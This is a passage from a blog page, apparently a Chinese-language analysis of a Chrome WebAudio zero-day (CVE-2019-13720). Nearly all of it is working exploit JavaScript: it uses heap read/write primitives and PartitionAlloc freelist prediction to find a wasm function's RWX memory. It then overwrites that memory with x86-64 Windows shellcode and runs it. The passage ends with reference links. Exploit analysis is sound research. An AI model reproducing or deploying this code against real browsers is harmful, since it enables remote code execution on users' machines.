</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 设置 fileReader 的 onerror 事件处理
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">fileReader</span>.<span style="color:#a6e22e">onerror</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">wasmFuncA</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// fileReaderLoader -&gt; fileReader -&gt; onerror/wasmFuncA -&gt; RWX
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">fileReaderPtr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">freelist</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fileReaderLoaderPtr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x10</span>)) <span style="color:#f92672">-</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x68</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">vectorPtr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">freelist</span>, <span style="color:#a6e22e">fileReaderPtr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x28</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">registeredEventListenerPtr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">freelist</span>, <span style="color:#a6e22e">vectorPtr</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">eventListenerPtr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">freelist</span>, <span style="color:#a6e22e">registeredEventListenerPtr</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">eventHandlerPtr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">freelist</span>, <span style="color:#a6e22e">eventListenerPtr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x8</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">jsFunctionObjPtr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">freelist</span>, <span style="color:#a6e22e">eventHandlerPtr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x8</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">jsFunctionPtr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">freelist</span>, <span style="color:#a6e22e">jsFunctionObjPtr</span>) <span style="color:#f92672">-</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">sharedFuncInfoPtr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">freelist</span>,
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">jsFunctionPtr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x18</span>)) <span style="color:#f92672">-</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">wasmExportedFunctionDataPtr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">freelist</span>,
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">sharedFuncInfoPtr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x8</span>)) <span style="color:#f92672">-</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">wasmInstancePtr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">freelist</span>,
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">wasmExportedFunctionDataPtr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x10</span>)) <span style="color:#f92672">-</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>	 
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">stubAddrFieldOffset</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">undefined</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> (<span style="color:#a6e22e">majorVersion</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">77</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">stubAddrFieldOffset</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">*</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">16</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">76</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">stubAddrFieldOffset</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">*</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">17</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">stubAddr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">freelist</span>, <span style="color:#a6e22e">wasmInstancePtr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">stubAddrFieldOffset</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 预测 ArrayBuffer 的地址
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">arrayBufferSize</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">arrayBufferPtr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getPartitionPageFreeListHeadEntryBySlotSize</span>(<span style="color:#a6e22e">freelist</span>, <span style="color:#a6e22e">iirFilterFeedforwardAllocationPtr</span>, <span style="color:#a6e22e">arrayBufferSize</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">arrayBufferPtr</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">audioBuffer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">audioCtx</span>.<span style="color:#a6e22e">createBuffer</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x400</span>, <span style="color:#ae81ff">6000</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gcPreventer</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">audioBuffer</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 修改 DataHolder 的 data_ 和 data_length_
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">dataHolderPtr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">freelist</span>, <span style="color:#a6e22e">arrayBufferPtr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x8</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">write64</span>(<span style="color:#a6e22e">freelist</span>, <span style="color:#a6e22e">dataHolderPtr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x8</span>), <span style="color:#a6e22e">stubAddr</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">write64</span>(<span style="color:#a6e22e">freelist</span>, <span style="color:#a6e22e">dataHolderPtr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x10</span>), <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0xFFFFFFF</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 用 shellcode 改写 wasmFuncA
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">shellcode</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>([
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xF7</span>, <span style="color:#ae81ff">0xE7</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x58</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x48</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x1B</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x1B</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x49</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xD8</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x3C</span>, <span style="color:#ae81ff">0x4C</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xC3</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xC9</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0xC1</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xC1</span>, <span style="color:#ae81ff">0xE9</span>, <span style="color:#ae81ff">0x08</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0x0B</span>, <span style="color:#ae81ff">0x4C</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xC2</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xD2</span>, <span style="color:#ae81ff">0x44</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x1C</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xC2</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xDB</span>, <span style="color:#ae81ff">0x44</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x5A</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xC3</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xE4</span>, <span style="color:#ae81ff">0x44</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xC4</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x59</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xC0</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xE2</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x0C</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x3C</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0x4C</span>, <span style="color:#ae81ff">0x01</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xC7</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xD6</span>, <span style="color:#ae81ff">0xF3</span>, <span style="color:#ae81ff">0xA6</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x05</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xFF</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xC0</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0xE6</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x41</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x82</span>, <span style="color:#ae81ff">0x4C</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xC0</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0xC3</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xC9</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xC1</span>, <span style="color:#ae81ff">0x07</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xB8</span>, <span style="color:#ae81ff">0x0F</span>, <span style="color:#ae81ff">0xA8</span>, <span style="color:#ae81ff">0x96</span>, <span style="color:#ae81ff">0x91</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xBA</span>, <span style="color:#ae81ff">0x87</span>, <span style="color:#ae81ff">0x9A</span>, <span style="color:#ae81ff">0x9C</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xF7</span>, <span style="color:#ae81ff">0xD0</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xC1</span>, <span style="color:#ae81ff">0xE8</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0xE8</span>, <span style="color:#ae81ff">0xB0</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x89</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xC6</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xC9</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xF7</span>, <span style="color:#ae81ff">0xE1</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xB8</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x9C</span>, <span style="color:#ae81ff">0x9E</span>, <span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">0x9C</span>, <span style="color:#ae81ff">0xD1</span>, <span style="color:#ae81ff">0x9A</span>, <span style="color:#ae81ff">0x87</span>, <span style="color:#ae81ff">0x9A</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xF7</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xD0</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xE1</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xC2</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x83</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xEC</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0xE4</span>, <span style="color:#ae81ff">0xF0</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xD6</span>
</span></span><span style="display:flex;"><span>  ]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">payloadArray</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>(<span style="color:#a6e22e">audioBuffer</span>.<span style="color:#a6e22e">getChannelData</span>(<span style="color:#ae81ff">0</span>).<span style="color:#a6e22e">buffer</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">payloadArray</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">shellcode</span>, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// FreeListHead 填 0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">write64</span>(<span style="color:#a6e22e">freelist</span>, <span style="color:#a6e22e">partitionPagePtr</span>, <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">wasmFuncA</span>();
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) { }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getPartitionPageFreeListHeadEntryBySlotSize</span>(<span style="color:#a6e22e">freelist</span>, <span style="color:#a6e22e">iirAddr</span>, <span style="color:#a6e22e">slot_size</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">meta</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getPartitionPageMetadataArea</span>(<span style="color:#a6e22e">iirAddr</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">getMetaByPageIndex</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">i</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sizeOfMeta</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x20</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">meta</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">i</span>) <span style="color:#f92672">*</span> <span style="color:#a6e22e">sizeOfMeta</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">offsetBucket</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">slot</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">freelist</span>, <span style="color:#a6e22e">meta</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">offsetBucket</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">offsetSlotSize</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x18</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">maskSlotSize</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0xffffffff</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">offsetActivePage</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">curSlotSize</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">freelist</span>, <span style="color:#a6e22e">slot</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">offsetSlotSize</span>) <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">maskSlotSize</span>;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">bucket</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">undefined</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">bucket_size</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">delta</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> (<span style="color:#a6e22e">slot_size</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">throw</span> <span style="color:#e6db74">&#39;invalid slot size&#39;</span>;
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">break</span>; <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x140</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">delta</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x2c0</span>);
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">break</span>; <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0x20</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">delta</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">128</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">getSlotSize</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">slot</span>) =&gt; <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">freelist</span>,
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">slot</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">delta</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">offsetSlotSize</span>) <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">maskSlotSize</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">getSlotHead</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">slot</span>) =&gt; <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">freelist</span>,
</span></span><span style="display:flex;"><span>	  <span style="color:#a6e22e">slot</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">delta</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">offsetActivePage</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">next_slot</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">read64</span>(<span style="color:#a6e22e">freelist</span>, <span style="color:#a6e22e">getSlotHead</span>(<span style="color:#a6e22e">slot</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">next_slot</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="reference">Reference</h2>
<ul>
<li><a href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2019/CVE-2019-13720.html">https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2019/CVE-2019-13720.html</a></li>
<li><a href="https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/">https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/</a></li>
<li><a href="https://www.anquanke.com/post/id/244743">https://www.anquanke.com/post/id/244743</a></li>
</ul>
<ul class="pa0">
  
</ul>
<div class="mt6 instapaper_ignoref">
      
      
      </div>
    </div>

    <aside class="w-30-l mt6-l">




</aside>

  </article>

    </main>
    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
  <div class="flex justify-between">
  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="http://localhost:1313/" >
    &copy;  My New Hugo Site 2024 
  </a>
    <div><div class="ananke-socials"></div>
</div>
  </div>
</footer>

  </body>
</html>
